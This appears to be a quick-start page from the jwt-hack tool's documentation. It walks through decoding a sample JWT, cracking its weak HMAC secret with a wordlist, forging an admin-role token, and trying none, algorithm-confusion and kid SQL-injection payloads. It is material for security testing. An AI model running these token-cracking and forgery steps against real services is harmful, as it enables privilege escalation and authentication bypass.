+++
toc = true
title = "Quick Start"
weight = 3
+++

This walkthrough takes one token from "what is this?" to "I can sign my own". It uses the sample wordlist in the repo, so clone it or grab [`samples/wordlist.txt`](https://github.com/hahwul/jwt-hack/blob/main/samples/wordlist.txt) first.

The target token:

```text
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.D_n2MSe6B7KiG1sfhn_U7x4s3HPEYo-uisUj4DQBEOc
```

## 1. Read it

```bash
jwt-hack decode eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6InVzZXIifQ.D_n2MSe6B7KiG1sfhn_U7x4s3HPEYo-uisUj4DQBEOc
```

```text
▎ Payload
  {
    "sub": "1234",
    "role": "user"
  }
```

HS256 with a `role` claim. If the secret is weak, you can change `role` and re-sign.

## 2. Scan it

```bash
jwt-hack scan <TOKEN> --skip-payloads
```

`scan` runs every check in one go. The interesting line:

```text
  ▲ CRIT  Weak Secret            Uses weak secret: 'test'
```

## 3. Crack it properly

The scanner only tries a short built-in list. For a real engagement, point `crack` at a wordlist:

```bash
jwt-hack crack -w samples/wordlist.txt <TOKEN>
```

```text
✓ Secret found

  Secret        test
```

No wordlist handy? `-p 3` downloads and caches a list of known JWT secrets. See [crack](/usage/commands/crack/) for presets and brute force.

## 4. Forge a new token

Re-sign the payload with `role` set to `admin`:

```bash
jwt-hack encode '{"sub":"1234","role":"admin"}' --secret=test
```

```text
▎ Token
  eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0Iiwicm9sZSI6ImFkbWluIn0.N25cQtIDZAGWfnifZeT4MF79lzvCgkwp9V_uPldhg7U
```

## 5. Confirm it verifies

```bash
jwt-hack verify <FORGED_TOKEN> --secret=test
```

```text
✓ Token is valid.
```

Send it to the target and see what the `admin` role unlocks.

## When the secret doesn't crack

A strong secret doesn't mean the token is safe. Next, try the server's parsing and key handling:

```bash
jwt-hack payload <TOKEN> --target none,alg_confusion,kid_sql
```

Each payload targets a different implementation bug. [payload](/usage/commands/payload/) explains what each one tests.

## Where to go next

- [Commands](/usage/commands/): every command and flag
- [Examples](/usage/examples/): recipes for common engagement scenarios
- [Scripting & Automation](/advanced/scripting-automation/): `--json` output for pipelines
